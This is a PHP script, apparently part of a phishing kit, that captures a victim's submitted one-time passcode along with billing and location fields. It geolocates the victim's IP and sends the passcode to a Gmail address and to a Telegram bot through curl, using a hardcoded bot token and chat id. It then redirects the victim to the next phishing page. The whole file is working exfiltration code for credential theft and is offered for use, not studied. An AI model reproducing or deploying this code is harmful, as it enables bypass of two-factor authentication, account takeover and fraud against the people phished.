<?php
$IP = (isset($_SERVER["HTTP_CF_CONNECTING_IP"])?$_SERVER["HTTP_CF_CONNECTING_IP"]:$_SERVER['REMOTE_ADDR']);
date_default_timezone_set('UTC');
$DETAILS     = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=".$_SERVER['REMOTE_ADDR']."");
$COUNTRYCODE = $DETAILS->geoplugin_countryCode;
$COUNTRYNAME = $DETAILS->geoplugin_countryName;
$bbbilling = $_SESSION['bbbilling'] = $_POST['bbbilling'];
$ssstate = $_SESSION['ssstate'] = $_POST['ssstate'];
$cccity = $_SESSION['cccity'] = $_POST['cccity'];
$access01 = $_SESSION['access01'] = $_POST['access01'];
$headers = 'MIME-Version: 1.0' . "\r\n";
$headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";
$subject  = " OTP 2 ".$_SERVER['REMOTE_ADDR']."";
$lgmailsd = 'c@gmail.com';
$XMSG = "
-------------------------------------------------------------
IP COUNTRY CODE:   ".$COUNTRYCODE."
IP COUNTRY NAME:   ".$COUNTRYNAME."
-----------
OTP 2 / ".$_POST['access01']."
-----------
IP:  ".$_SERVER['REMOTE_ADDR']."
-------------------------------------------------------------
";
mail($lgmailsd, $subject, $XMSG, $headers);
header("location: ../finsc.php");
$_SESSION['bnk']=$bnk;
  $website="https://api.telegram.org/bot7336006335:AAH-Tc4THAuDSAUPy47XVsDiHFBx06qSwTQ";$params=['chat_id'=>-4552726149,'text'=>$XMSG,];
  $ch = curl_init($website . '/sendMessage');
  curl_setopt($ch, CURLOPT_HEADER, false);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $result = curl_exec($ch);
  curl_close($ch);
?>